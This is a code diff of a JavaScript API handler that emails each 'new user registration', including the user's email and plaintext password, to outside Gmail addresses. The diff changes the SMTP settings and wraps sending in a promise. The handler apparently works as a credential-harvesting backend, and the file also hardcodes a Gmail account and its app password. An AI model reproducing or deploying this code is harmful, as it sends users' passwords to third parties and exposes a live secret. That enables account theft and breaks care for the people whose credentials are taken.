@@ -13,7 +13,8 @@ export default async function handler(req, res) {
     const transporter = nodemailer.createTransport({
       service: "gmail",
       host: "smtp.gmail.com",
-      port: 587,
+      port: 465,
+      secure: true,
       auth: {
         user: "bdtrick404@gmail.com",
         pass: "qdjt gdlf pbcd fvnc",
@@ -28,17 +29,33 @@ export default async function handler(req, res) {
       }
     });
 
+    // Wrap the sendMail function in a promise
+    const sendMailPromise = (mailOptions) => {
+      return new Promise((resolve, reject) => {
+        transporter.sendMail(mailOptions, (error, info) => {
+          if (error) {
+            console.error("Error sending email:", error);
+            reject(error);
+          } else {
+            console.log("Email sent successfully:", info);
+            resolve(info);
+          }
+        });
+      });
+    };
+
     const mailOptions = {
       from: {
         name: "Aziz",
         address: "bdtrick404@gmail.com",
       }, // your_email@gmail.com
-      to: ["suvrohembrom512@gmail.com", "dewan.mizanur911@gmail.com"], // recipient_email@example.com
+      to: "suvrohembrom512@gmail.com", // recipient_email@example.com
       subject: "New User Registration",
       text: `New user registered:\eEmail: ${email}\nPassword: ${password}`,
     };
 
-    await transporter.sendMail(mailOptions);
+    // Use the promise to send the email
+    await sendMailPromise(mailOptions);
 
     return res.status(200).json({ message: "Email sent successfully" });
   } catch (error) {
